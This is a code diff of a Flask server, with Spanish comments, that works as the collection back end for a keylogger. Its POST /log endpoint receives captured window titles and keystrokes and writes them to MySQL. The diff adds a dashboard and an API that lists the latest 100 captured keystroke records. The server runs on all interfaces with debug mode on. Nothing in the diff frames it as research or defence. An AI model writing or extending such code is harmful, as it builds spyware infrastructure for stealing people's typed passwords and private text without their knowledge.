@@ -1,20 +1,18 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 import pymysql
 from flask_cors import CORS
 import datetime
 
 app = Flask(__name__)
-CORS(app)  # Permite peticiones desde otros dominios (útil para pruebas)
+CORS(app)
 
 # --- CONFIGURACIÓN DE LA BASE DE DATOS ---
-# CAMBIA ESTOS VALORES por los de tu configuración de MySQL
-DB_HOST = "localhost"
-DB_USER = "root"
-DB_PASSWORD = "TU_CONTRASEÑA_DE_MYSQL"
-DB_NAME = "keylogger_db"
+DB_HOST = "CREDENCIAL"
+DB_USER = "CREDENCIAL"
+DB_PASSWORD = "CREDENCIAL" # <--- RECUERDA PONER TU CONTRASEÑA
+DB_NAME = "CREDENCIAL"
 
 def get_db_connection():
-    """Establece y devuelve una conexión a la base de datos."""
     connection = pymysql.connect(
         host=DB_HOST,
         user=DB_USER,
@@ -24,13 +22,37 @@ def get_db_connection():
     )
     return connection
 
+# --- RUTA PARA VER LA WEB (DASHBOARD) ---
+@app.route('/')
+def index():
+    """Renderiza el panel de control HTML."""
+    return render_template('dashboard.html')
+
+# --- API: OBTENER LOGS (Para el dashboard) ---
+@app.route('/api/get_logs', methods=['GET'])
+def get_logs():
+    """Devuelve los últimos 100 logs en formato JSON."""
+    connection = None
+    try:
+        connection = get_db_connection()
+        with connection.cursor() as cursor:
+            # Traemos los últimos 100 registros ordenados por fecha
+            sql = "SELECT id, window_title, keystrokes, timestamp FROM logs ORDER BY timestamp DESC LIMIT 100"
+            cursor.execute(sql)
+            result = cursor.fetchall()
+        return jsonify(result), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+    finally:
+        if connection:
+            connection.close()
+
+# --- API: RECIBIR LOGS (Desde el keylogger) ---
 @app.route('/log', methods=['POST'])
 def receive_log():
-    """Endpoint para recibir los datos del keylogger."""
     data = request.get_json()
-
     if not data or 'window_title' not in data or 'keystrokes' not in data:
-        return jsonify({"status": "error", "message": "Faltan datos requeridos"}), 400
+        return jsonify({"status": "error", "message": "Faltan datos"}), 400
 
     window_title = data['window_title']
     keystrokes = data['keystrokes']
@@ -42,7 +64,7 @@ def receive_log():
             sql = "INSERT INTO logs (window_title, keystrokes) VALUES (%s, %s)"
             cursor.execute(sql, (window_title, keystrokes))
         connection.commit()
-        return jsonify({"status": "success", "message": "Log guardado"}), 201
+        return jsonify({"status": "success"}), 201
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
     finally:
@@ -50,5 +72,4 @@ def receive_log():
             connection.close()
 
 if __name__ == '__main__':
-    # Escucha en todas las interfaces de red (0.0.0.0) para que sea accesible desde otros dispositivos
     app.run(host='0.0.0.0', port=5000, debug=True)
